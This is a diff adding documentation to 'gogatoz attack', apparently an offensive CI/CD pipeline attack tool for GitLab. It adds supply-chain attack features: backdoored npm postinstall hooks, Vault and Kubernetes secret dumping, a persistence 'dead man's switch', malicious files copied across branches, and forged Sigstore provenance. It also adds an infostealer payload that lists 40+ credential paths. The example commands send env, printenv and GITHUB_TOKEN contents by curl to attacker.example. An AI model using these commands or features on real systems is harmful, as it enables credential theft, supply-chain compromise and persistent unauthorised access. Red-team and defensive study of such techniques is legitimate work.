@@ -21,6 +21,12 @@ gogatoz attack [options]
 - Commit CI to target repo: `--commit-ci` with exactly one CI source: `--ci-yaml`, `--ci-file`, `--ci-stdin`, or `--payload`.
 - Secrets exfiltration: `--secrets` creates a pipeline that posts environment/variables to a webhook (optionally RSA-encrypts).
 - Payload rendering only: `--payload-only` prints a single-job .gitlab-ci.yml to stdout without committing.
+- npm registry tampering: `--npm-tamper` publishes a backdoored npm package via a CI pipeline targeting the project's npm registry.
+- Vault enumeration: `--vault-enum` enumerates HashiCorp Vault secrets reachable from CI job identity (JWT/OIDC auth).
+- Kubernetes secret sweep: `--k8s-secrets` dumps Kubernetes secrets from namespaces accessible to the CI runner's service account.
+- Dead man's switch: `--dead-mans-switch` installs a scheduled pipeline or external monitor that triggers a handler if the attacker's access is revoked.
+- Branch mutator: `--branch-mutator` replicates a malicious file across all (or filtered) branches in the target project.
+- Sigstore provenance: `--sigstore` generates a cosign-compatible provenance attestation for a tampered package to make it appear legitimately signed.
 
 ## Key Options
 
@@ -43,6 +49,7 @@ gogatoz attack [options]
   - `secrets` (alias: `secrets-exfil`): Dump env/variables to webhook.
   - `git-hook`: Install git hooks on runner build dirs to capture tokens from subsequent jobs.
   - `cache-poison`: Poison CI cache with malicious content (targets shared cache keys).
+  - `infostealer`: Expanded credential sweep (40+ paths) covering AI tools, chat/IM, VPN, K8s, Docker, `gh auth token`, and recursive `.env` file discovery.
 
 ### Common payload options
 - `--job-name` string: Job name.
@@ -85,6 +92,48 @@ gogatoz attack [options]
 - `--cache-key` string: Cache key to target (default: default).
 - `--cache-path` string: Cache path to poison (default: .).
 - `--poison-cmd` string: Command to run for cache poisoning.
+
+### npm-tamper options
+- `--npm-registry` string: npm registry URL to publish to (default: project's GitLab npm registry).
+- `--npm-package` string: Package name to tamper with (required).
+- `--npm-inject-script` string: Shell command to inject into the package's `postinstall` hook.
+
+### vault-enum options
+- `--vault-addr` string: HashiCorp Vault address (default: `$VAULT_ADDR` from CI environment).
+- `--vault-auth-method` string: Vault auth method: `jwt` or `oidc` (default: jwt).
+
+### k8s-secrets options
+- `--k8s-namespaces` string: Comma-separated Kubernetes namespaces to sweep (default: all accessible namespaces).
+
+### dead-mans-switch options
+- `--dms-monitor-url` string: URL the dead man's switch pings to confirm attacker presence (required).
+- `--dms-interval` string: Check interval (default: 1h). Accepts Go duration syntax (e.g., 30m, 2h).
+- `--dms-ttl` string: Time-to-live before the handler fires if the monitor URL stops responding (default: 24h).
+- `--dms-handler` string: Shell command or payload to execute when the switch triggers.
+- `--dms-platform` string: Where to install the switch: `scheduled-pipeline` or `external-cron` (default: scheduled-pipeline).
+
+### branch-mutator options
+- `--mutator-file` string: File path to create or overwrite in each branch (required).
+- `--mutator-content` string: Content for the mutated file. Use `--ci-file` to read from disk instead.
+- `--mutator-max-branches` int: Maximum number of branches to mutate (default: 0 = all branches).
+
+### sigstore options
+- `--sigstore-package` string: Package name or OCI reference to generate provenance for (required).
+- `--sigstore-version` string: Package version to attest (required).
+
+### Infostealer enhancements
+
+The `infostealer` payload type performs an expanded credential sweep across 40+ common credential paths on the runner filesystem, including:
+
+- **AI tools**: `.openai`, `.anthropic`, Copilot tokens, `.config/github-copilot`
+- **Chat / IM**: Slack tokens, Discord tokens, Teams webhooks
+- **VPN**: OpenVPN configs, WireGuard keys
+- **Kubernetes**: `~/.kube/config`, service account tokens at `/var/run/secrets/`
+- **Docker**: `~/.docker/config.json`, registry auth
+- **GitHub CLI**: `gh auth token` extraction
+- **Environment files**: Recursive `.env` file sweep across the build directory
+
+Use `--payload infostealer` with `--payload-only` to preview or with `--commit-ci` to deploy.
 
 ### Script injection (`--inject-script`)
 
@@ -279,6 +328,51 @@ gogatoz attack --commit-ci --target group/proj \
 ```bash
 gogatoz attack --target group/proj --cleanup --cleanup-jobs \
   --cleanup-jobs-ref gogatoz-attack --cleanup-jobs-max 3
+```
+
+### 13) npm package tampering
+```bash
+gogatoz attack --npm-tamper --target group/proj \
+  --npm-package @scope/shared-utils --npm-inject-script 'curl -sd "$(env)" https://attacker.example/cb' \
+  --branch gogatoz-attack --deconflict suffix
+```
+
+### 14) Vault secret enumeration
+```bash
+gogatoz attack --vault-enum --target group/proj \
+  --vault-addr https://vault.internal:8200 --vault-auth-method jwt \
+  --tags shell
+```
+
+### 15) Kubernetes secret sweep
+```bash
+gogatoz attack --k8s-secrets --target group/proj \
+  --k8s-namespaces default,production,staging \
+  --tags kubernetes --webhook https://attacker.example/k8s
+```
+
+### 16) Dead man's switch persistence
+```bash
+gogatoz attack --dead-mans-switch --target group/proj \
+  --dms-monitor-url https://attacker.example/heartbeat \
+  --dms-interval 30m --dms-ttl 12h \
+  --dms-handler 'curl -sd "$(printenv)" https://attacker.example/dms-fired' \
+  --dms-platform scheduled-pipeline
+```
+
+### 17) Branch mutator (spread across branches)
+```bash
+gogatoz attack --branch-mutator --target group/proj \
+  --mutator-file .github/workflows/lint.yml \
+  --mutator-content 'run: curl -sd "$GITHUB_TOKEN" https://attacker.example/cb' \
+  --mutator-max-branches 10
+```
+
+### 18) Sigstore provenance forgery
+```bash
+gogatoz attack --sigstore --target group/proj \
+  --sigstore-package ghcr.io/org/app --sigstore-version v1.2.3 \
+  --tags shell --branch gogatoz-attack --deconflict suffix
 ```
 
 ## Security Considerations
